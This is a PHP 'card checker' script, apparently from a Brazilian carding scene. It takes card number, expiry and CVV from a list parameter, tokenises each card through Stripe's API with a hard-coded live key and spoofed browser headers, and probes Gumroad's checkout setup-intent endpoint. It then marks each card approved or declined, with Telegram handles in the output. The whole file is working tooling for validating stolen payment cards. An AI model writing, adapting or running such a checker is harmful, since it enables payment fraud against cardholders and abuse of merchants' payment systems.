<?php
session_start();
#############################################
error_reporting(0);
set_time_limit(0);
$time = time();
#############################################
$lista = $_GET["lista"];
$cc = trim(explode("|", $lista)[0]);
$mes = trim(explode("|", $lista)[1]);
$ano = trim(explode("|", $lista)[2]);
$cvv = trim(explode("|", $lista)[3]);

if (strlen($mes) < 2) {
  $mes = "0$mes";
}

function chave($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookie.txt');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json',
'Accept-Language: pt-BR,pt;q=0.9',
'Origin: https://js.stripe.com',
'Referer: https://js.stripe.com/',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f5658227-7f6a-4aab-b6d7-937871c31e15cf334c&muid=e4af6153-58cc-4269-aeb0-28368e91248e1eef78&sid=ea17576f-2996-4a4b-8f70-9bb53042c69d3039d8&pasted_fields=number&payment_user_agent=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+card-element&time_on_page=72739&key=pk_live_Db80xIzLPWhKo1byPrnERmym&_stripe_version=2020-08-27');
$pegartoken = curl_exec($ch);
$pm =  chave($pegartoken, '"id": "', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://app.gumroad.com/stripe/setup_intents");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/html',
'Accept-Language: pt-BR,pt;q=0.9',
'Origin: https://app.gumroad.com',
'Referer: https://app.gumroad.com/checkout',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
'X-Csrf-Token: SW-1LHCojZ1APQEjGbIiQVe0k67HFgKBdYc5bhBlINU',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'status=success&type=card&reusable=false&stripe_payment_method_id='.$pm.'&card_country=BR&card_country_source=stripe&permalink=');
$retorno = curl_exec($ch);
echo $erro = getStr($pay, '"error_code":"','"', 1);

if(strpos($retorno, 'cvc')){
  echo '<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Aprovada</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #4300dc, #3a16e1, #2f23e6, #202deb, #0035f0);">'.$banco.' '.$level.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Retorno: (Cvv Invalido)</span> <span class="badge badge-dark"><a href="https://t.me/bruxo_dev77"> @bruxo_dev77 </span>  <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
}elseif(strpos($retorno, 'success":true')) {
  echo '<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Aprovada</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #4300dc, #3a16e1, #2f23e6, #202deb, #0035f0);">'.$banco.' '.$level.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Compra realizada com sucesso</span> <span class="badge badge-dark"><a href="https://t.me/bruxo_dev77"> @bruxo_dev77 </span>  <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
}elseif(strpos($retorno, 'funds')) { 
  echo '<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Aprovada</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #4300dc, #3a16e1, #2f23e6, #202deb, #0035f0);">'.$banco.' '.$level.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Saldo Baixo</span> <span class="badge badge-dark"><a href="https://t.me/elementcenter"> @elementcenter </span>  <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
}elseif(strpos($retorno, 'charge_automatically')) {
  echo '<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Aprovada</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #4300dc, #3a16e1, #2f23e6, #202deb, #0035f0);">'.$banco.' '.$level.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Compra realizada com sucesso</span> <span class="badge badge-dark"><a href="https://t.me/elementcenter"> @elementcenter </span>  <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
}elseif(strpos($retorno, 'Too many requests from this IP')) {
  echo '<span class="badge badge-info"style="background: linear-gradient(to right, #ff007a, #ff0062, #ff0049, #ff002d, #ff0000);"> Reprovada </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #8500dc, #7a00e1, #6d00e6, #5e00eb, #4900f0);">Limite Excedido</span> <span class="badge badge-dark"> <a href="https://t.me/elementcenter"> @elementcenter </span> <span class="badge badge-dark"> ('.(time() - $time).' SEG)</span><br>'; 
  }else{
  echo '<span class="badge badge-info"style="background: linear-gradient(to right, #ff007a, #ff0062, #ff0049, #ff002d, #ff0000);"> Reprovada </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #ff007a, #ff0062, #ff0049, #ff002d, #ff0000);">'.$banco.' '.$level.'</span> </span> <span class="badge badge-dark"><a href="https://t.me/elementcenter">@elementcenter</span> <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
  }

?>